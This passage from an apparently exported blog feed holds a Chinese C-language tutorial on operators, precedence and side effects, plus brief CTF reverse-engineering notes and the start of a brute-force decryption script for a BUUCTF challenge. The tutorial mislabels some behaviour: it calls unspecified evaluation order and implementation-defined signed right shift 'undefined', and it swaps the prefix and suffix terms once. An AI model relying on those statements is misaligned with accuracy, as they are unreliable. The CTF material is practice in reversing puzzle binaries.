a;</code></p><p>因为3是一个常量,你不能对其进行修改—无论是从语法上还是从逻辑上都不正确.很显然,3就是3,我们当然不能把3&quot;赋值&quot;为4.实际上,我们判断这样的语句是否合法,看的是<code>=</code>左边是否为一个<code>左值</code>,更准确的说,是<code>可修改的左值</code>.</p><h4 id="数据对象-左值-右值">数据对象,左值,右值</h4><p>这部分可参考C Primer Plus第六版的对应内容!</p><p>赋值表达式的实际效果是将某个值存储到某个指定的内存位置上,这一段指定的数据存储空间称之为<code>数据对象</code>,也许有些朋友了解过面向对象和面向过程的区别,请不要混淆,这里的&quot;对象&quot;指的是操作的焦点.C标准只有在这时才会使用<code>对象</code>这个术语.</p><p>C语言中,所谓<code>左值</code>就是用于标识特定数据对象的名称或表达式,所以,对象指的是实际的数据存储,而左值实际上是一个用于标识或定位存储位置的标签.例如<code>a=3;</code>中a就是标识了变量a的位置,编译器根据这个标签找到变量a的存储位置,最后把值3存储进去.</p><p>此外,上面还提到了表达式,而不仅仅只是一个简单名称,这意味着,只要能够正确标识一个位置,就是一个左值.关于这部分内容,我们需要学习到后面才能知道,例如可以使用<code>数组下标运算符</code>指定数组元素等,我们先不急.</p><p>我们还提到了<code>可修改的左值</code>,之所以说这个,是因为C标准中新增了(2023年早就已经不是新增了)<code>const</code>限定符,用const创建的变量的值不可变(我们之前讲解使用常量时提到过).那么,用const修饰过的变量自然不能作为<code>=运算符</code>的左操作数.</p><p>而至于<code>a=3;</code>中的3,相应的,是一个<code>右值</code>.右值指的是能赋给可修改左值的量,且本身不是左值.</p><p>总的来说,使用一个<code>=运算符</code>需要两个操作数,左侧(左操作数)必须为一个可修改的左值,而右侧(右操作数)既可以是左值也可以是一个右值,当然,一个不可修改的左值也可以作为右操作数.</p><h3 id="加法运算符">加法运算符: +</h3><p>+的使用非常显而易见,但是我们需要注意的是,+的左右两个操作数无论是否为右值,最后加法运算的结果(也就是这个表达式的值)一定是一个右值.</p><p>例如:</p><p><code>a+b</code>中,a和b都是左值,但是a+b计算出来的值,也就是表达式a+b是一个右值.</p><h3 id="减法运算符">减法运算符: -</h3><p>同理,它用于减法运算,和+一样,需要两个操作数.</p><p>+和-都需要两个操作数,所以他们都是<code>二元运算符</code>.</p><h3 id="符号运算符-和">符号运算符: +和-</h3><p>这里和加法,减法运算符使用相同的符号,但是一定注意,他们是不同的!</p><p>因为我们可以有这样的一个表达式:</p><p><code>+a</code></p><p>或者</p><p><code>-a</code></p><p>这意味这此处的+或-仅仅需要一个操作数,所以他们都是<code>一元运算符</code>,其作用也很简单—取相反数.</p><p>不过在过去,<code>+a</code>是不被允许的.</p><h3 id="乘法和除法运算符-和">乘法和除法运算符: *和/</h3><p>关于这两个表达式之前就说过了,他们也是<code>二元运算符</code>.需要注意的是,别忘了除法运算符有<code>截断</code>这个特性(整数除法结果的小数部分被丢弃).</p><h2 id="重点-运算符优先级和求值顺序">重点:运算符优先级和求值顺序</h2><p>我们现在仅讲解了基本运算符,我们拿这些简单的运算符进行举例.</p><h3 id="优先级">优先级</h3><p>优先级和数学上运算符优先级的意义是类似的,与数学相似,无论是加减乘除,还是赋值等运算符都有不同的优先级,如果一个表达式有多个运算符,我们首先根据优先级来确定表达式的运算顺序.</p><p>考虑下面的代码:</p><p><code>sum = 12.0 + 40.0 * n / part;</code></p><p>假设n的值为2,part的值为4.</p><p>这条语句中的赋值运算符右面有加法,乘法和除法运算符,先算哪一个?这里无需废话,和数学一样,先算乘除法,再算加减法,但是这是我们一眼看出来的,如果是C编译器来处理这段代码,则必须有提前规定好的运算顺序,也就是<code>先算乘除法,再算加减法</code>.</p><p>C语言中对此问题有着明确的规定,为每一个运算符都规定了各自的<code>优先级</code>,优先级高的运算符(乘除法)先执行运算,然后返回的结果再继续和优先级低的运算符(加减法)结合执行运算,这样,上面的代码如何运算就非常明确.</p><p>如果两个运算符的优先级相同怎么办?如果他们处理同一个运算符对象,则根据他们在语句中出现的顺序而言,<code>大多数运算符都是从左向右依次运算(=运算符除外)</code>.</p><p>如此,上面的语句是如此执行:</p><p>40.0 * n        首先计算*或/,发现他们处理同一个操作数n,则根据从左向右结合的顺序,先计算*,结果是80.0</p><p>80.0 / part     然后计算/,结果为40.0</p><p>12.0 + 40.0     最终结果为52.0</p><p>到目前为止,我们学习过的运算符的优先级:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004211804464.png" alt="image-20231004211804464" style="zoom:45%;" /><p>注意对于C语言而言,符号运算符和加减法运算符是不同的,首先他们的操作数的数量就不同.</p><h3 id="求值顺序">求值顺序</h3><p>为了解决运算顺序,C语言明确规定了运算符的优先级,但是这并没有规定所有的顺序,来看下面的代码:</p><p><code>y = 6 * 12 + 5 * 20;</code></p><p>当运算符共享一个运算对象时,优先级确定了求值顺序,再进一步,如果优先级相同(例如乘除),那么结合性进一步确定求值顺序.</p><p>但是,上面这个语句中,有两个乘法运算.显然这两个乘法比加法先进行运算,但是问题来了:这两个乘法先算哪个.</p><p>实际上,C语言<code>并未规定</code>这两个乘法先计算哪一个,这取决于具体实现—意味着不同的电脑(计算机),甚至是一台电脑上不同的编译器运行出来的结果也不相同—有可能先算前者的实现在A硬件上效率更高,在B硬件上反而更适合先算后者.这种未明确规定的行为叫做<code>未定义行为</code>,这里就是一个关于<code>求值顺序</code>的未定义行为,他们十分重要!</p><p>许多朋友可能认为这并不是一个问题,事实上非常重要,<strong>不清晰的代码甚至可能引发严重的问题</strong>(我们会在后面介绍到其他运算符后并重新讲解<code>副作用</code>时进行举例).</p><p>不过,就上面的这样代码而言,先算后算并没有影响,因为4个操作数都是常数,也就不存在副作用的影响,最终的结果显然不变.</p><h2 id="其他算数运算符">其他算数运算符</h2><p>学习这节之前,要学会进制转换,并尽量了解原码,补码和反码.</p><h3 id="求模运算符">求模运算符: %</h3><p>%运算符用于求<code>a除以b的余数</code>,该运算符要求左右两个操作数<code>必须</code>均为整数.</p><p>关于正数,没有任何问题.</p><p>对于负数而言,例如<code>-8%3</code>,其结果要多注意一下.</p><p>我们有公式:<code>A % B = A - A / B * B</code></p><p>或者可以简单记忆规律:</p><p><strong>取模运算结果的正负是由左操作数的正负决定的.如果%左操作数是正数,那么取模运算的结果是非负数;如果%左操作数是负数，那么取模运算的结果是负数或0</strong></p><h3 id="位运算符">位运算符: &amp;,|,^,&lt;&lt;,&gt;&gt;</h3><p>位运算的位,指的是二进制位,也就是说,位运算直接以二进制来处理操作数.</p><h4 id="按位与">按位与: &amp;</h4><p>二者皆为1,结果才为1,否则为0</p><p>例如 <code>3 &amp; 1</code>的结果为<code>1</code></p><p>即二进制011和001按位<code>与</code>运算,结果为001,也就是十进制1</p><h4 id="按位或">按位或: |</h4><p>二者皆为0,结果才为0,否则为1</p><p>例如 <code>3 | 2</code>的结果为<code>3</code></p><p>即二进制011和010按位<code>或</code>运算,结果为011,也就是十进制3</p><h4 id="按位异或">按位异或: ^</h4><p>二者相同为0,不同为1</p><p>例如 <code>4 ^ 2</code>的结果为<code>6</code></p><p>即二进制100和010按位<code>异或</code>运算,结果为110,也就是十进制<code>6</code></p><h4 id="左移运算符">左移运算符: &lt;&lt;</h4><p>该运算符将操作数(以二进制处理)每一位向左移动(即向高位移动)k位,右边空出来的k位(即低位)用0填充,高位溢出的k位丢弃</p><p>例如 <code>3 &lt;&lt; 2</code>的结果为<code>12</code></p><p>这里以一个字节的移位来举例</p><p>即3的二进制00000011向左移动2位,结果为00001100,其中最左边的2个0丢弃,最右边填充2个0,也就是十进制<code>12</code></p><p>实际上,由于是对二进制移位,对m左移k位相当于m乘以2^k.例如3&lt;&lt;2的结果就是3*2^2,也就是12</p><p>如果不能理解,尝试假设十进制移位,将m进行十进制左移k位相当于乘以10^k,例如3&lt;&lt;(base10)2的结果就是3*10^2,也就是300</p><p>关于负数,左移会影响其符号位.</p><h4 id="右移运算符">右移运算符: &gt;&gt;</h4><p>这里要注意,尽量对正数进行右移,而不要对负数进行右移.</p><p>原因是:由于整数在计算机中以补码存储,最高位为符号位,那么就会有两种不同的右移—<code>算数右移</code>和<code>逻辑右移</code>.</p><h5 id="算数右移">算数右移:</h5><p>右移k位时,高位空出来的k位以原操作数的符号位填充,以保持结果的符号不变.</p><h5 id="逻辑右移">逻辑右移:</h5><p>右移k位时,高位空出来的k位以0填充.</p><h5 id="c语言的实现">C语言的实现</h5><p>C语言中,右移取决于具体实现,尽管<code>大部分实现(编译器)为算数右移</code>,但是不能保证所有的机器/编译器都是这样.</p><p>也就是说,C语言中,对于有符号数的右移操作,这是一个<code>未定义行为</code>.我们尽量避免对有符号数(负数)进行右移操作.</p><h4 id="移位运算符的问题">移位运算符的问题</h4><p>关于左移和右移的另一个问题是,如果我们指定移动的位数为负数(例如<code>&lt;&lt; -3</code>),或者大于等于左操作数原本的二进制位数(例如,int为32位,但是我们<code>&lt;&lt; 33</code>)</p><p>那么<code>该行为未定义</code>,具体请查阅文档.例如,某些实现中,对int值进行<code>&lt;&lt; -3</code>被处理为<code>&lt;&lt; 32 + (-3)</code>也就是<code>&lt;&lt; 29</code></p><h2 id="逻辑运算符">逻辑运算符</h2><p>与&amp;&amp;,或||,非!</p><p>注意位运算的&amp;和|是单独的一个&amp;和|,与逻辑运算符没有任何关系</p><p>在讲解循环的时候,已经讲解了逻辑运算符,已经基本包含所有问题,同时讲解了<code>短路效应</code>,短路效应可能引发的问题会在后面<code>副作用</code>的讲解中描述.</p><h2 id="比较-关系-运算符">比较(关系)运算符</h2><p>==,&lt;=,&gt;=,&lt;,&gt;,!=</p><p>同样在前面已经讲解.</p><p>需要注意的是,比较运算符常常和逻辑运算符搭配,例如:</p><p><code>if(a &gt;= 0 &amp;&amp; a &lt;= 100)</code></p><p>这里仍需要注意<code>优先级</code>的问题,逻辑运算符的优先级整体低于比较运算符(除了<code>非!</code>),所以,先判断a的两个范围,即<code>是否大于等于0</code>和<code>是否小于等于100</code>,最后取并集,也就是是否在0~100内.</p><p>实际上也就是<code>if( ( a &gt;= 0 ) &amp;&amp; ( a &lt;= 100 ) )</code></p><p>一般情况下,<code>()</code>的优先级全场最高(虽然标准中并未将其定义为运算符,但是一般将其称为&quot;括号运算符&quot;),我们可以使用<code>()</code>来改变优先级.</p><h2 id="赋值运算符">赋值运算符</h2><p>不仅仅有<code>=运算符</code>这个最基本的赋值运算符,为了简化代码,C语言还有其他的几种赋值运算符,我们将其称为<code>复合赋值运算符</code>.我们直接来看<code>标准</code>中的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004230937705.png" alt="image-20231004230937705" style="zoom:50%;" /><p>就是这些,写代码时如果有类似的赋值,直接使用复合赋值运算符即可.</p><h2 id="自增自减运算符">自增自减运算符</h2><p>这两个运算符本来是用于简化形如<code>a=a+1</code>和<code>a=a-1</code>这样的表达式的,但是实际上,有些其他语言的开发者甚至认为C语言的这两个运算符的特性带来的弊大于利.</p><h3 id="和-运算符">++和–运算符</h3><p>正如上面所写,用于简化形如<code>a=a+1</code>和<code>a=a-1</code>这样的表达式.</p><p><code>a=a+1</code>就等价于单独的<code>++a</code>或者<code>a++</code></p><p><code>a=a-1</code>就等价于单独的<code>--a</code>或者<code>a--</code></p><p>++和–有一个操作数,并允许该操作数放在左边(前缀自增/自减,例如a++)或放在右边(后缀自增/自减,例如–a)</p><h4 id="前缀和后缀的重要区别与副作用">前缀和后缀的重要区别与副作用</h4><p>前缀和后缀两种写法在单独使用时没有任何区别(一般编译器都会进行优化).</p><p>但是如果将其放在表达式中,就会出现区别.考虑下面两个语句:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">3</span>,b=<span class="number">3</span>,c,d;</span><br><span class="line"><span class="comment">// 第一条语句</span></span><br><span class="line">c = ++a;</span><br><span class="line"><span class="comment">// 第二条语句</span></span><br><span class="line">d = b++;</span><br></pre></td></tr></table></figure><p>读者认为执行完后a,b,c,d的值各自是什么?</p><p>答案是: a为4,b为4,c为4,d为3</p><p>是否出乎你的预料?</p><p>实际上是这样的,从结果上来看:</p><p>1.前缀<code>++a</code>返回的结果为a自增后的值,也就是4,将其赋值给c,a最终为4</p><p>2.后缀<code>b++</code>返回的结果为b自增前的值,也就是3,将其赋值给d,b最终也为4</p><p>也就是说,前缀和后缀都会将操作数自增,但是这个表达式作为一个整体,返回的值是不一样的.</p><p>有的人可能会这么理解:<code>&quot;++a是先自增,再返回值;a++是先返回值,再自增&quot;</code></p><p>从初学的角度和前后缀写法表现出的结果来看,这么理解情有可原,但是!这样的理解绝对错误!</p><p>错误的原因在于认为返回值这个操作先于自增运算.</p><p>事实上,任意的运算符,都会返回一个值,也就是运算结果,例如<code>1+1</code>返回一个<code>2</code>作为运算结果,而任何运算符,都是要先将其运算彻底完成,最终将特定的某一个值作为这个表达式的值返回.</p><p>有关这个问题,在后面的<code>指针自增运算和解引用</code>还会进行讲解!</p><p>为了讲明前缀和后缀的运算过程,我们直接写出其(类似,这里相当于模拟了一个函数)等价的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//++a类似等价于下面的几行代码:</span></span><br><span class="line">a = a + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//a++类似等价于下面的几行代码:</span></span><br><span class="line">temp = a;</span><br><span class="line">a = a + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br></pre></td></tr></table></figure><p>我们实际上把++a或a++这两个表达式的值使用return语句来表示,相信各位能够理解我这里的意思,而不是去错误的疯狂思考为什么和return是&quot;等价的&quot;.</p><p>显然,我们可以看出:</p><p>1.对于<code>++a</code>,我们单纯的将其值加1,然后将a返回即可,所以,<code>++a</code>的值为a的新值.</p><p>2.对于<code>a++</code>,我们<code>创建</code>了一个<code>副本</code>(也就是temp,由于演示,a不一定是int)来保存a原来的值,然后a的值加1,最后返回temp,也就是a原来的值.此时,a已经是新值了,但是<code>++a</code>的值为a的旧值.</p><p>以上拿++来讲解,–是完全同理的.</p><p>上面已经讲解的十分明白了,如果各位感兴趣,可以去看《C和指针》这本书中相关的讲解.</p><p>尽管++和–的主要目的是将操作数的值加1或减1,但是我个人仍然愿意将其归为这个运算符的<code>副作用</code>,毕竟,其要组成表达式,表达式的值<code>通常</code>是重点关注的对象.但是,巧就巧在这里我们既要关心自增,又要使用其返回的值.</p><p>那么,我个人倾向于将++a或–a等视作&quot;有副作用的表达式&quot;,也就是说,<code>我更关心这个表达式最终的值</code>,而这几个表达式的主要作用—将a自增或自减1—我认为是<code>副作用</code>,因为对这个表达式进行求值是不可逆的(当然可以再减回去或加回去,你知道我不是这个意思),<code>它们让a的值发生了变化</code>!</p><p>这里再次出现了<code>副作用</code>的概念,虽然大部分资料均为有这个名词的描述,可能甚至根本不关心,但是由于初学者的许多代码(无论是他们自己写的,或者是某些烂书/烂资料/烂题中出现的)常常会纠结表达式的<code>副作用</code>及引出的相关一些<code>未定义行为</code>,从而导致理解和使用的错误,本教程要对这个问题进行详细讨论!</p><h2 id="其他运算符">其他运算符</h2><h3 id="sizeof运算符">sizeof运算符</h3><p>是的,这是一个运算符,可能许多朋友认为他是一个函数,但是他确确实实是一个运算符.</p><p>sizeof运算符用于求运算对象的大小,结果以字节为单位.</p><p>运算对象可以是<code>类型</code>或<code>表达式</code>.</p><p>例如:</p><p><code>sizeof(int)</code>在32位机器下的结果为<code>4</code>—大多数情况下int占用4字节</p><p><code>sizeof(char)</code>的结果为<code>1</code>—char类型占用1字节</p><p>若有<code>char a=2;</code>那么<code>sizeof(a)</code>的结果为1—char类型的变量占用1字节</p><p>之所以说sizeof不是函数,是因为我们可以这样写:</p><p>若有<code>char a=2;</code>那么可以写<code>sizeof a</code>,省略了<code>小括号()</code></p><p>但是需要注意,sizeof作用于类型的时候,必须加上<code>小括号()</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004235532383.png" alt="image-20231004235532383" style="zoom:50%;" /><p>上图可以看出编译器报错了.</p><p>注意,sizeof运算符返回的结果并不是<code>int</code>,而是<code>size_t</code>:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004235749893.png" alt="image-20231004235749893" style="zoom:50%;" />我们只要记住他是一个无符号的整数即可,而且通常printf时最好使用<code>%llu</code>来输出:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004235906154.png" alt="image-20231004235906154" style="zoom:50%;" /><p>上图为CLion的截图,CLion对这里的%d做出了警告,当然,因为sizeof(int)和sizeof(char)的值太小了,实际上用%d也无妨,但是,最好还是规范代码.</p><h3 id="逗号运算符">逗号运算符: ,</h3><p>逗号运算符<code>,</code>用于将多个表达式连接起来,构成一个更大的表达式—可以叫它<code>逗号表达式</code>.</p><p>需要注意的两点是,<code>逗号运算符是全局优先级最低的运算符,并且其结合律为从左向右</code>.</p><p>另外重要的一点是,<code>最后一个子表达式的值作为整个逗号表达式的值来返回</code>.</p><h4 id="使用示例1">使用示例1:</h4><p>我们可以利用逗号运算符将不相关的,功能相似的几步操作放在一起.例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    a = b = c = <span class="number">4</span>; <span class="comment">// 由于各个赋值运算符的优先级相同,且结合律为从右向左,所以先执行c=4,然后b=c=4,最后a=b=4</span></span><br><span class="line">    a++, b++, c++; <span class="comment">//   逗号表达式的优先级最低,且结合律为从左向右,所以先执行a++,然后b++,最后c++</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, a, b, c); <span class="comment">// 5 5 5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码举了一个最简单的例子,我们想要把a,c,c的值都自增1,并且互不影响,就可以这么写在用一条语句中,使用逗号运算符进行连接.</p><h4 id="使用示例2">使用示例2:</h4><p>必须指出的是,一定要注意<code>互不影响</code>这个问题,如果各个表达式的求值之间有影响,那么就需要慎重考虑,甚至运行结果可能不是我们想要的.例如举一个没有什么实际意义的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">4</span>;</span><br><span class="line">    a = b + <span class="number">1</span>, <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a); <span class="comment">// 输出结果为5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尽管这段代码没有什么实际意义,但是足以说明问题.</p><p>前面已说明,逗号运算符的优先级全场最低,所以第5行的语句中有两个被逗号运算符连接起来的表达式:</p><p><code>a = b + 1</code>和<code>printf(&quot;%d&quot;,a)</code></p><p>第二个表达式调用了printf()函数,它叫做<code>函数调用表达式</code>,这里的<code>小括号()</code>前面加上一个函数标识符(中间可能有参数)代表一个<code>函数调用</code>.</p><p>前面同样已说明,逗号运算符的结合性是从左向右,那么我们应该先计算<code>a = b + 1</code>,让a的值变为<code>5</code>,然后在调用printf()函数将a的值输出,所以最终的输出结果是<code>5</code>.</p><p>这里同样可以认为对a赋值实际上产生了一个副作用,然后这个副作用影响到了后面的表达式的继续求值—对printf的调用仍然认为是对表达式求值,只是这里的表达式是一个<code>函数调用表达式</code>.导致输出的a不再是原来的<code>3</code>.</p><h4 id="使用示例3">使用示例3:</h4><p>如果你还是对这里的副作用的影响没有什么重视的话,下面的代码可能让你重新思考:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, b;</span><br><span class="line">    b = (++a, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, b); <span class="comment">// 输出结果为4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我知道很多人可能会骂我,说我用一个很不好的(甚至是极差的)代码作为例子来讲解,但是,为了说明轻视副作用可能导致的危害,我还是要以一些不良的代码作为反面教材.</p><p>我们前面的示例1和示例2都在主要关注由逗号运算符连接起来的两个子表达式,在示例3中,我们的代码的关注点是<code>逗号表达式</code>整体的值!</p><p>显然,(++a,a)的两个子表达式之间的副作用有互相影响—即++a执行后,对a的求值结果将会是一个自增后的新值.</p><p>前面已经说明:<code>最后一个子表达式的值作为整个逗号表达式的值来返回</code>.那么,<code>++a,a</code>这个表达式的最终的值就是最后一个表达式<code>a</code>的值,由于<code>++a</code>使a变为4,则表达式<code>a</code>的值为<code>4</code>,进而最终赋值给b的值为<code>4</code>.</p><p>所以,最后输出的结果为<code>4</code>.</p><p>这个示例示范了如何求整个逗号表达式的值,并进一步的说明了副作用的问题.如果<code>++a</code>不是我们的本意,那么就很可能存在一个难以察觉的bug.</p><p><code>我们要万分小心,仅仅是初学到现在,我们就已经遇到了好几种运算符的副作用可能引发的潜在问题!---即使你自己完全没有意识到!</code></p><h4 id="进一步拓展-低级错误引发的bug">进一步拓展-低级错误引发的bug</h4><p>注:上面的讲解可能有点牵强,实际上,更常见的出乎我们本意的代码是这样:</p><p>将 <code>a == 3</code>错误地写成 <code>a = 3</code>,原来的表达式用于检验a的值是否为3—根据实际情况返回1或者0.</p><p>但是 <code>a = 3</code>却是直接将a的值覆盖为3,然后这个表达式返回<code>=</code>右边的值,也就是3,C语言中,3为非0值,意味着这个表达式的永远为真!这才算得上是一个非常容易犯的低级错误—导致了一个可能很难察觉的bug—也许大多数情况下他本来就是<code>真</code>,所以短时间很难发觉这个bug!</p><p>所以,很多人愿意将上面的表达式这样写: <code>3 == a</code>,因为 <code>3 = a</code>的写法根本无法通过编译!</p><h3 id="其他">其他</h3><p>其他的运算符暂时不予讲解,学了后面的知识才能进行讲解.</p><p>例如<code>成员访问运算符</code>等.</p><br><p>本章进行了运算符,优先级,求值顺序的讲解.同时在关键的前缀/后缀++或–的讲解中描述了什么是<code>副作用</code>,由于在许多方面都会有体现,并且碍于目前讲到的知识不足,这里不方便展开讲解,所以在后面的各个知识点的讲解中会穿插进行讲解.</p><p>​—WAHAHA 2023.10.4</p><br><br><p>上一篇:<a href="../2023-09-27-0671b7d09817">C语言教程-8-跳转控制和嵌套</a></p><p>下一篇:<a href="../2023-10-20-b7fda0df05ff">C语言教程-10-数组</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序结构分析</title>
      <link href="/2023-09-30-d0939b85fcd0/"/>
      <url>/2023-09-30-d0939b85fcd0/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机程序执行">计算机程序执行</h1><h2 id="fini-arry">.fini_arry</h2><p>2023.9.22</p><p>问题来自<code>[2019红帽杯]easyRE</code></p><p>该题中对<code>off_6CC090</code>用十次base64解密出来一个网页作为混淆,向下继续分析发现还有一个<code>byte_6CC0A0</code>开头的数据段,寻找其调用函数发现一个(隐藏的)函数,从此函数中破解出flag(具体见该题WP)</p><p>问题:这个函数没有在main中调用,那么为什么写进来呢—我最后也没弄明白,这函数跑完也啥也没干</p><p>实际发现,这个函数被写入.fini_arry中,在程序结束时进行调用:</p><p>来自https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array的回答:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922151506432.png" alt="image-20230922151506432"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向中加密算法的识别和解密</title>
      <link href="/2023-09-30-706ab6136d99/"/>
      <url>/2023-09-30-706ab6136d99/</url>
      
        <content type="html"><![CDATA[<h1 id="加密算法分析">加密算法分析</h1><h2 id="字符对称加密有求模运算">字符对称加密有求模运算</h2><p>如果遇到这种加密,有密文的情况下(当然),可以直接爆破,并且不是把所有的组合都显示出来,直接判断是否和密文相等即可.</p><p>例题-BUUCTF-SimpleRev</p><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">join</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> v2; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> *dest; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    v3 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">    dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2 + v3 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, a1);</span><br><span class="line">    <span class="built_in">strcat</span>(dest, a2);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// char str2[100] = &#123;0&#125;;</span></span><br><span class="line">    <span class="comment">// char key[100];</span></span><br><span class="line">    <span class="comment">// char *text;</span></span><br><span class="line">    <span class="comment">// char key1[100] = &quot;ADSFK&quot;;</span></span><br><span class="line">    <span class="comment">// char key3[100] = &quot;kills&quot;;</span></span><br><span class="line">    <span class="comment">// char chr; // [rsp+Fh] [rbp-51h]</span></span><br><span class="line">    <span class="comment">// int v2; // [rsp+10h] [rbp-50h]</span></span><br><span class="line">    <span class="comment">// int v3; // [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">    <span class="comment">// int i; // [rsp+18h] [rbp-48h]</span></span><br><span class="line">    <span class="comment">// int v5; // [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">    